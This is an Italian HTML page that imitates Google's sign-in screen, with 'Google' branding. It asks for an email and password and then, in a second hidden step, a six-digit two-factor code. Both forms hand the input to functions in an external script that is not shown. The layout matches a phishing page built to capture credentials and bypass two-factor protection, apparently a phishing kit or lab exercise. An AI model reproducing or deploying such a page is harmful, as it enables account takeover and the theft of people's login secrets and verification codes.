<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Accedi a Google</title>
  <link rel="stylesheet" href="style.css">
  <script src="google.js"></script>
</head>
<body>
  <div class="login-container">
    <!-- Sezione Login -->
    <div id="login-section" class="login-section">
      <h1 class="logo">Google</h1>
      <h2>Accedi al tuo Account</h2>
      <div class="message">Usa il tuo account Google</div>

      <form class="login-form" onsubmit="login(event)">
        <div class="input-group">
          <label for="email">Email o numero di telefono</label>
          <input type="email" id="email" name="email" placeholder="Es. mario.rossi@gmail.com" required>
        </div>

        <div class="input-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" placeholder="Inserisci la tua password" required>
        </div>

        <div class="actions">
          <button type="submit" class="submit-btn" id="invia">Accedi</button>
          <div class="forgot-password">
            <a href="#">Password dimenticata?</a>
          </div>
        </div>
      </form>

      <div class="signup-container">
        <span>Non hai un account?</span>
        <a href="#">Crea un account</a>
      </div>
    </div>

    <!-- Sezione 2FA -->
    <div id="2fa-section" class="login-section" style="display:none;">
      <h1 class="logo">Google</h1>
      <h2>Verifica la tua identit√†</h2>
      <div class="message">Inserisci il codice a 2 fattori che ti abbiamo inviato.</div>

      <form class="login-form" onsubmit="verify2FA(event)">
        <div class="input-group">
          <label for="code">Codice a 2 fattori</label>
          <input type="text" id="code" name="code" placeholder="Codice a 6 cifre" required>
        </div>

        <div class="actions">
          <button type="submit" class="submit-btn" id="verify">Verifica</button>
        </div>
      </form>
    </div>
  </div>
</body>
</html>
